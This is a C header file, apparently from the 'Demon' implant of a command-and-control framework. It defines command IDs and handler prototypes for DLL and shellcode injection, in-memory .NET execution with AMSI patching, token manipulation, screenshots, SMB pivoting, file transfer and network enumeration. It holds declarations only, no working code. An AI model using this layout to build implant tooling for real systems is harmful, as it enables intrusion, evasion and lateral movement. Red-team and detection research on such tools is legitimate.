#ifndef DEMON_COMMAND_H
#define DEMON_COMMAND_H

#include <Core/Parser.h>


/* Commands */
#define DEMON_COMMAND_CHECKIN                   100
#define DEMON_COMMAND_GET_JOB                   1
#define DEMON_COMMAND_NO_JOB                    10
#define DEMON_COMMAND_SLEEP                     11
#define DEMON_COMMAND_PROC                      0x1010
#define DEMON_COMMAND_PROC_LIST                 12
#define DEMON_COMMAND_FS                        15
#define DEMON_COMMAND_INLINE_EXECUTE            20
#define DEMON_COMMAND_JOB                       21
#define DEMON_COMMAND_INJECT_DLL                22
#define DEMON_COMMAND_INJECT_SHELLCODE          24
#define DEMON_COMMAND_SPAWN_DLL                 26
#define DEMON_COMMAND_TOKEN                     40
#define DEMON_COMMAND_ASSEMBLY_INLINE_EXECUTE   0x2001
#define DEMON_COMMAND_ASSEMBLY_VERSIONS         0x2003
#define DEMON_COMMAND_NET                       2100
#define DEMON_COMMAND_CONFIG                    2500
#define DEMON_COMMAND_SCREENSHOT                2510
#define DEMON_COMMAND_PIVOT                     2520
#define DEMON_COMMAND_TRANSFER                  2530
#define DEMON_COMMAND_SOCKET                    2540

#define DEMON_INFO                      89
#define DEMON_OUTPUT                    90
#define DEMON_ERROR                     91
#define DEMON_EXIT                      92
#define DEMON_INITIALIZE                99

#define DOTNET_INFO_AMSI_PATCHED        0x1
#define DOTNET_INFO_NET_VERSION         0x2
#define DOTNET_INFO_ENTRYPOINT_EXECUTED 0x3
#define DOTNET_INFO_FINISHED            0x4
#define DOTNET_INFO_FAILED              0x5

#define CALLBACK_ERROR_WIN32            0x1
#define CALLBACK_ERROR_COFFEXEC         0x2
#define CALLBACK_ERROR_TOKEN            0x3

// Config options
#define DEMON_CONFIG_SHOW_ALL                0

#define DEMON_CONFIG_IMPLANT_SLEEPMASK       1
#define DEMON_CONFIG_IMPLANT_SPFTHREADADDR   3
#define DEMON_CONFIG_IMPLANT_VERBOSE         4
#define DEMON_CONFIG_IMPLANT_SLEEP_TECHNIQUE 5
#define DEMON_CONFIG_IMPLANT_COFFEE_THREADED 6
#define DEMON_CONFIG_IMPLANT_COFFEE_VEH      7

#define DEMON_CONFIG_MEMORY_ALLOC            101
#define DEMON_CONFIG_MEMORY_EXECUTE          102

#define DEMON_CONFIG_INJECTION_TECHNIQUE     150
#define DEMON_CONFIG_INJECTION_SPOOFADDR     151

#define DEMON_CONFIG_INJECTION_SPAWN64       152
#define DEMON_CONFIG_INJECTION_SPAWN32       153

#define DEMON_NET_COMMAND_DOMAIN             1
#define DEMON_NET_COMMAND_LOGONS             2
#define DEMON_NET_COMMAND_SESSIONS           3
#define DEMON_NET_COMMAND_COMPUTER           4
#define DEMON_NET_COMMAND_DCLIST             5
#define DEMON_NET_COMMAND_SHARE              6
#define DEMON_NET_COMMAND_LOCALGROUP         7
#define DEMON_NET_COMMAND_GROUP              8
#define DEMON_NET_COMMAND_USER               9

#define DEMON_PIVOT_LIST                     1

#define DEMON_PIVOT_SMB_CONNECT              10
#define DEMON_PIVOT_SMB_DISCONNECT           11
#define DEMON_PIVOT_SMB_COMMAND              12

#define DEMON_INFO_MEM_ALLOC                 10
#define DEMON_INFO_MEM_EXEC                  11
#define DEMON_INFO_MEM_PROTECT               12
#define DEMON_INFO_PROC_CREATE               21

#define DEMON_CHECKIN_OPTION_PIVOTS          1

typedef struct
{
    INT ID;
    VOID ( *Function ) ( PPARSER Arguments );
} DEMON_COMMAND ;

VOID CommandDispatcher( VOID );

VOID CommandCheckin( VOID );
VOID CommandSleep( PPARSER DataArgs );
VOID CommandExit( PPARSER DataArgs );
VOID CommandJob( PPARSER DataArgs );
VOID CommandProc( PPARSER DataArgs );
VOID CommandProcList( PPARSER DataArgs );
VOID CommandFS( PPARSER DataArgs );
VOID CommandInjectDLL( PPARSER DataArgs );
VOID CommandInjectShellcode( PPARSER DataArgs );
VOID CommandSpawnDLL( PPARSER DataArgs );
VOID CommandInlineExecute(PPARSER DataArgs);
VOID CommandDotnet( PPARSER Parser );
VOID CommandAssemblyInlineExecute( PPARSER DataArgs );
VOID CommandAssemblyListVersion( VOID );
VOID CommandScreenshot( PPARSER Parser );

// Modules
VOID CommandConfig( PPARSER Parser );
VOID CommandNet( PPARSER Parser );
VOID CommandToken( PPARSER Parser );
VOID CommandPivot( PPARSER Parser );
VOID CommandTransfer( PPARSER Parser );
VOID CommandSocket( PPARSER Parser );

#endif
